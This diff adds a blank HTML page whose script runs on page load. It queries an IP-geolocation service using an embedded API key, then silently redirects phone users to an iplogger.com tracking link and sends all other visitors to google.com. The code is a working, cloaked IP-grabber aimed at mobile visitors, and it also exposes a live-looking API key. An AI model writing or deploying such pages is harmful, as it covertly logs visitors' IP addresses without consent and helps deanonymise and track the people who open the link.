@@ -1,0 +1,30 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<meta charset="utf-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<title></title>
+</head>
+<body>
+
+	<script type="text/javascript">
+		const api_url = "https://api.ipgeolocation.io/user-agent?apiKey=b39e4943371d40d387c9aaade661bf87"
+		async function getISS(){
+			const response = await fetch(api_url);
+			const data = await response.json();
+			var iSmobile = data.device.type;
+
+			console.log(iSmobile)
+		if (iSmobile == "Phone") {
+			window.location.replace("https://iplogger.com/2wrkW5");
+		} 
+			else {
+				window.location.replace("https://google.com");
+			}
+		}
+
+		getISS();
+	</script>
+
+</body>
+</html>
